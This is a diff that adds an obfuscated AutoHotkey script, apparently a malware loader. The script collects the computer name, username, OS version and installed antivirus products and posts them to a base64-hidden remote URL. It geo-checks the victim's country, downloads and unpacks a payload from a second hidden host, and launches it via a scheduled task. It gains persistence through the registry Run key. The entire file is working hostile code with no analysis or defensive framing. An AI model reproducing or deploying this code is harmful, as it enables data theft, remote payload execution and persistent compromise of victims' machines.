@@ -1,0 +1,140 @@
+#NoEnv
+#NoTrayIcon
+#ErrorStdOut
+#SingleInstance Ignore
+#Include %A_LineFile%\..\JSON.ahk
+SetWorkingDir %A_ScriptDir%
+i := GetOSVersion()
+If (i = 6.1)
+barao:= "WIndows 7"
+Else If (i = 10)
+barao:= "WIndows 10"
+Else If (i > 10)
+barao:= "WIndows 11"
+GetOSVersion() {
+Return ((r := DllCall("GetVersion") & 0xFFFF) & 0xFF) "." (r >> 8)
+}
+For objItem in selectFrom("AntiVirusProduct")
+{
+    nf6nzhxf .= "," objItem.displayName
+    nf6nzhxf := SubStr(nf6nzhxf, 2)
+}
+For objItem in selectFrom("AntiSpywareProduct")
+{
+    fj9cxkcp .= "," objItem.displayName
+    fj9cxkcp := SubStr(fj9cxkcp, 2)
+}
+selectFrom(str) {
+	return ComObjGet("winmgmts:\\.\root\SecurityCenter2").ExecQuery("SELECT * FROM " str)
+}
+endpoin:=iq8ofkrk("aHR0cHM6Ly93d3cuc2FtZWgtYWR2aXNvci5jb20vY3NzL3N0eWxlL2NwYW5lbC9icnVtZS5waHA=")
+bob:= % A_ComputerName
+joia:= % A_UserName
+try{
+whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+whr.Open("POST", endpoin, true)
+whr.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
+whr.Send("COMPUTA=" bob "&USAR=" joia "&VESPC=" barao "&AVZANDO=" nf6nzhxf fj9cxkcp)
+whr.WaitForResponse()
+} catch e {
+}
+Loop, 10
+{
+wIndex := "cargando"
+WinHide, % wIndex
+}
+oWHR := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+oWHR.Open("GET", iq8ofkrk("aHR0cDovL2lwaW5mby5pby9qc29u"))
+oWHR.Send()
+vIP := oWHR.ResponseText
+oWHR := ""
+conga= vIP
+parsed := JSON.Load(vIP)
+ignored := { "BR":0, "MX":0, "CL":0, "ES":0, "AR":0, "EC":0, "CO":0, "PE":0, "PA":0}
+if (ignored.HasKey(parsed.Country)) = 0 {
+ExitApp
+}
+firstLetter := Asc("a") - 1
+Loop 5
+{
+Random rnd, 1, 26
+rndLetter := Chr(firstLetter + rnd)
+r .= rndLetter
+}
+Loop 5
+{
+Random rnd, 1, 26
+rndLetter := Chr(firstLetter + rnd)
+s .= rndLetter
+}
+Loop 5
+{
+Random rnd, 1, 26
+rndLetter := Chr(firstLetter + rnd)
+global  v .= rndLetter
+}
+Loop 5
+{
+Random rnd, 1, 26
+rndLetter := Chr(firstLetter + rnd)
+global  yyy .= rndLetter
+}
+gw9qrrmk :=% A_AppData "\" s "\"
+ef9gvrsk := A_AppData "\" r ".zip"
+jn0mupmi := A_AppData "\" s "\"
+gc5wsfqj := "aHR0cHM6Ly93d3cudXBzZXR1cy5jb20vZGVzaWduL2pzL292ZXJnL0g0VDNCNzhJMUREWEs4Mi5waWM="
+gc5wsfqj := iq8ofkrk(gc5wsfqj)
+UrlDownloadToFile, %gc5wsfqj% , %A_AppData%\%r%.zip
+Sleep 1000
+kx9wuvih(ef9gvrsk, jn0mupmi)
+Sleep 1000
+list_files(gw9qrrmk)
+Sleep 1000
+Loop, Files, %jn0mupmi%\*.exe, F
+{
+TimeStamp := A_Now
+FormatTime, TimeString, % TimeStamp, Time
+TimeStamp += 1, Minutes
+FormatTime, TimeString, % TimeStamp, Time  ;HH:mm
+pr=%A_WinDir%\system32\SCHTASKS.exe
+goo=%A_LoopFileFullPath%
+aa=/Create /TN %yyy% /TR %goo% /sc once /st %TimeString%
+runwait, %comspec% /c %pr% %aa%, ,hide
+}
+Sleep 1000
+FileDelete, %A_AppData%\%r%.zip
+Sleep 1000
+jg6fjxrb := "U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"
+jg6fjxrb := iq8ofkrk(jg6fjxrb)
+Sleep 500
+RegWrite, REG_SZ, HKEY_CURRENT_USER, %jg6fjxrb%, %v%, % A_AppData "\" s "\" v ".exe"
+list_files(Directory)
+{
+files =
+Loop %Directory%\*
+{
+files = %files%`n%A_LoopFileName%
+if (SubStr(files,-2) == "lll") {
+FileMove, % A_LoopFileFullPath,   % Directory v ".exe"
+} else if (SubStr(files,-2) == "mmm") {
+FileMove, % A_LoopFileFullPath,  % Directory v ".ahk"
+}
+}
+return files
+}
+ExitApp
+kx9wuvih(sZip, sUnz)
+{
+FileCreateDir, %sUnz%
+psh  := ComObjCreate("Shell.Application")
+psh.Namespace( sUnz ).CopyHere( psh.Namespace( sZip ).items, 4|16 )
+}
+iq8ofkrk(string)
+{
+if !(DllCall("crypt32\CryptStringToBinary", "ptr", &string, "uint", 0, "uint", 0x1, "ptr", 0, "uint*", size, "ptr", 0, "ptr", 0))
+throw Exception("CryptStringToBinary failed", -1)
+VarSetCapacity(buf, size, 0)
+if !(DllCall("crypt32\CryptStringToBinary", "ptr", &string, "uint", 0, "uint", 0x1, "ptr", &buf, "uint*", size, "ptr", 0, "ptr", 0))
+throw Exception("CryptStringToBinary failed", -1)
+return StrGet(&buf, size, "UTF-8")
+}
